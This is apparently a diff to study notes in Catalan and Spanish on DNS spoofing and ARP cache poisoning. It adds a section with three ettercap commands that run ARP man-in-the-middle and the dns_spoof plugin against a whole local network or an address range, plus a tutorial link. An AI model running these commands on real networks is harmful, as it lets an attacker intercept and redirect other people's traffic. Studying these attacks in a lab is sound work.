@@ -487,6 +487,18 @@ Connectar-se a Twitter - Farà la redirecció a 10.200.243.137
     <img src="./Photos/DNSSpoof.png" />
 </div>
 
+# Ettercap per CLI
+
+- https://esgeeks.com/tutorial-ettercap-ejemplos/
+
+Utiliza el siguiente comando para lanzar una suplantación de DNS:
+
+sudo ettercap -T -q -P dns_spoof -i wlan0 -M arp /// ///
+#Otro comando, para toda la red
+sudo  ettercap -T -q -M arp -i wlan0 -P dns_spoof -p //192.168.1.1/
+#Para un rango de red
+sudo ettercap -T -q -M arp -i wlan0 -P dns_spoof //192.168.1.1/ 192.168.1.51/
+
 # Explicació resumida:
 
 ARP Spoof - DNS Cache Poisoning
@@ -543,3 +555,4 @@ https://www.keyfactor.com/blog/what-is-dns-poisoning-and-dns-spoofing/
 - https://www.boomernix.com/2018/03/realizando-un-dns-spoofing.html
 - https://www.keyfactor.com/blog/what-is-dns-poisoning-and-dns-spoofing/
 - https://ciberseguridad.blog/25-tipos-de-ataques-informaticos-y-como-prevenirlos/
+- https://esgeeks.com/tutorial-ettercap-ejemplos/
